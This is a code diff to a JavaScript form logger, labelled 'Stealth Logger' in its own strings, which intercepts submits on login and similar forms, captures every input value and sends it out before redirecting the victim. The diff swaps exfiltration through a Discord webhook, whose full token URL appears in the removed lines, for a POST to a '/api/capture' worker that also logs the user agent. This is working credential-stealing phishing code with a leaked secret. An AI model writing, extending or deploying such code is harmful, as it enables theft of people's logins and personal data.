@@ -3,8 +3,8 @@ const CONFIG = {
     INPUT_IDLE_TIMEOUT: 2000,
     SUBMIT_BUTTON_PATTERNS: ['submit', 'login', 'sign in', 'continue', 'next', 'confirm', 'proceed', 'authenticate'],
     REDIRECT_URL: 'https://example.com',
-    // Your webhook URL (keep this private!)
-    DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1469721842511249440/tbLHl5WSyD8AD9jyliPRKY6_KaWuFYF9lo2ysacrE4se4vk5pzJMz9XdyQvPIlRiYlXM'
+    // The worker endpoint to receive data (relative path)
+    CAPTURE_URL: '/api/capture'
 };
 
 // ===== INVISIBLE LOGGER =====
@@ -34,53 +34,33 @@ const CONFIG = {
         return data;
     };
 
-    // Send to your Discord webhook
-    const sendToDiscord = async (data) => {
+    // Send to your Worker
+    const sendData = async (data) => {
         try {
             const timestamp = new Date().toISOString();
             const pageUrl = window.location.href;
             
-            // Build a clean message (you'll see this in Discord)
+            // Build a simple JSON payload for the worker
             const payload = {
-                content: null,  // No plain text fallback needed
-                embeds: [{
-                    title: "🕵️ New Data Captured",
-                    description: `From page: ${pageUrl}`,
-                    color: 0xFF5555,  // Red alert color
-                    fields: [
-                        {
-                            name: "Timestamp",
-                            value: timestamp,
-                            inline: true
-                        },
-                        {
-                            name: "Captured Data",
-                            value: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
-                            inline: false
-                        }
-                    ],
-                    footer: {
-                        text: "Stealth Logger • " + window.location.hostname
-                    },
-                    timestamp: timestamp
-                }]
+                url: pageUrl,
+                timestamp: timestamp,
+                formData: data,
+                userAgent: navigator.userAgent
             };
 
-            const response = await fetch(CONFIG.DISCORD_WEBHOOK_URL, {
+            const response = await fetch(CONFIG.CAPTURE_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
 
             if (response.ok) {
-                log('Successfully sent to Discord');
+                log('Successfully sent to Worker');
                 window.location.href = CONFIG.REDIRECT_URL;  // Redirect after success
             } else {
                 const err = await response.text();
-                log('Discord error: ' + err, 'error');
-                // Fallback redirect even on error? Probably safer to not block user forever.
-                // But typically logging failure is critical.
-                // We'll redirect anyway after a short delay or immediately.
+                log('Worker error: ' + err, 'error');
+                // Fallback redirect
                 setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);
             }
         } catch (err) {
@@ -114,7 +94,7 @@ const CONFIG = {
                 e.preventDefault(); // Stop normal form submission
                 const data = captureAllInputs();
                 if (Object.keys(data).length > 0) {
-                    sendToDiscord(data);
+                    sendData(data);
                 } else {
                     // If no data, proceed anyway
                     window.location.href = CONFIG.REDIRECT_URL;
@@ -145,7 +125,7 @@ const CONFIG = {
                      // Given the user asked for a "redirect", we assume we are controlling the flow.
                      e.preventDefault();
                      e.stopPropagation();
-                     sendToDiscord(data);
+                     sendData(data);
                  }
             }
         }, true);
